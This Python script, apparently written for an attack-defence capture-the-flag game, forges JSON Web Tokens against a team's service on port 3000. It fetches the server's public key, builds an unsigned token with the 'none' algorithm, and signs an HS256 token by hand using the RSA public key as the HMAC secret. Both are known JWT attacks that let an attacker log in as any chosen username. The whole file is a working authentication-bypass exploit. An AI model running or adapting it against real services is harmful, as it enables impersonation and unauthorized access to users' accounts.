import base64
import hashlib
import hmac
import json
import sys
from datetime import datetime

import jwt
import requests


def base64url_encode(input):
    return base64.urlsafe_b64encode(input).replace(b'=', b'')


def get_pubkey(ip):
    r = requests.get(ip + '/pubkey')
    return r.text.strip()


def generate_jwt_none(username):
    return jwt.encode({'username': username}, "", algorithm="none")


def generate_jwt_hmac(username, key):
    # jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate
    # and should not be used as an HMAC secret. :(
    # return jwt.encode({"username": username, "iat": datetime.utcnow()}, key, algorithm="HS256")

    header = json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    payload = json.dumps(
        {"username": username}).encode()

    to_sign = base64url_encode(header) + b'.' + base64url_encode(payload)

    signature = hmac.new(key.encode('utf-8'), to_sign, hashlib.sha256).digest()

    return base64url_encode(header) + b'.' + base64url_encode(payload) + b'.' + base64url_encode(signature)


if __name__ == "__main__":
    team_ip = "http://" + sys.argv[1] + ":3000"
    user = sys.argv[2]

    pubkey = get_pubkey(team_ip) + '\n'
    print("Pubkey:\n", pubkey)

    jwt_none = generate_jwt_none(user)
    print("JWT none: ", jwt_none.decode())
    jwt_none_decoded = jwt.decode(jwt_none, verify=False)
    print("Decoded: ", jwt_none_decoded)

    jwt_hmac = generate_jwt_hmac(user, pubkey)
    print("JWT hmac: ", jwt_hmac.decode())
    # jwt_hmac_decoded = jwt.decode(jwt_hmac, pubkey)  # throws exception
    # print("Decoded: ", jwt_hmac_decoded)
